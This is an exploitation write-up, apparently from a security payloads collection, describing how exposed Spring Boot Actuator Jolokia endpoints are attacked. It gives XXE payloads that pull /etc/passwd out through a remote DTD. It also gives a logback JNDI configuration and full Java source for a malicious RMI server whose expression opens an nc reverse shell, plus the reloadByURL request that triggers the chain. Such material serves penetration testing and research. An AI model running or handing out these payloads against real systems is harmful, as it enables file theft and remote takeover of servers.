# Spring Boot Actuator (jolokia) XXE/RCE

Information and payload from the following article: https://www.veracode.com/blog/research/exploiting-spring-boot-actuators

**Edit 28/02/2020**: another article to achieve RCE using H2 Database [Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database Aliases in Spring Boot 2](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

Tested on Spring Boot Actuator < 2.0.0 and Jolokia 1.6.0.

If you have access to the following ressource `/actuator/jolokia` or `/jolokia` with Spring Boot Actuator and the following ressource: **reloadByURL**, this writeup can help you to exploit an XXE and ultimately and RCE.

### Setup the environment:

```bash
git clone https://github.com/artsploit/actuator-testbed
cd actuator-testbed
mvn install
mvn spring-boot:run
```

### 1. The jolokia XXE

If the action **reloadByURL** exists, the logging configuration can be reload from an external URL: http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:1337!/logback.xml

The XML parser behind logback is SAXParser. We can exploit this feature to trigger an XXE Out-Of-Band Error based using the following payload:

```xml
# file logback.xml from the server 127.0.0.1:1337
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://127.0.0.1:8080/file.dtd">%remote;%int;]>
<a>&trick;</a>
```
```xml
# file file.dtd from the server 127.0.0.1:8080
<!ENTITY % d SYSTEM "file:///etc/passwd"> 
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```

The server responds with an error and the content of the file `/etc/passwd` is directly contained in it:

![image](https://user-images.githubusercontent.com/5891788/53958395-3c992700-40e1-11e9-9c79-0719613046f0.png)

### 2. Jolokia RCE

Exploiting an XXE is always nice but a RCE is always better.
Instead of loading a _fake_ XML we can send a legit XML configuration file to logback and fully exploit the feature. 

1. We ask to jolokia to load the new logging configuration file from an external URL
2. The [logging config](https://logback.qos.ch/manual/configuration.html#insertFromJNDI) contains a link to a malicious RMI server
3. The malicious RMI server will use a [template expression](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) vulnerability to execute code on the remote server

> In other words, JNDI is a simple Java API (such as 'InitialContext.lookup(String name)') that takes just one string parameter, and if this parameter comes from an untrusted source, it could lead to remote code execution via remote class loading.

https://www.veracode.com/blog/research/exploiting-jndi-injections-java

Content of the logback.xml file:

```xml
<configuration>
  <insertFromJNDI env-entry-name="rmi://127.0.0.1:1097/jndi" as="appName" />
</configuration>
```

Since my JDK is > 1.8.0_191 it's not possible to directly execute code using the RMI Service, so instead I will use this technique: https://www.veracode.com/blog/research/exploiting-jndi-injections-java

Then the next step is to create a vulnerable RMI service:

```java
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;
 
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f']).start()\")"));
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("jndi", referenceWrapper);
    }
}
```
pom.xml to compile this project:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.springframework</groupId>
    <artifactId>RMIServer</artifactId>
    <version>0.0.1</version>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.0.0.RELEASE</version>
    </parent>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
    </dependencies>

    <properties>
        <java.version>1.8</java.version>
    </properties>

</project>
```
Then when the two malicious servers are UP we can call the ressource ReloadByURL:

http://127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:1337!/logback.xml

Then the template expression is executed and you get a reverse shell:

![rc2](https://user-images.githubusercontent.com/5891788/53965875-49724680-40f2-11e9-894f-76267af8a0cf.png)

**Edit** Another writeup to exploit Jolokia https://blog.it-securityguard.com/how-i-made-more-than-30k-with-jolokia-cves/

## Ressources:
* https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
* https://www.veracode.com/blog/research/exploiting-jndi-injections-java
* https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
* https://github.com/artsploit/actuator-testbed
* https://xz.aliyun.com/t/4258
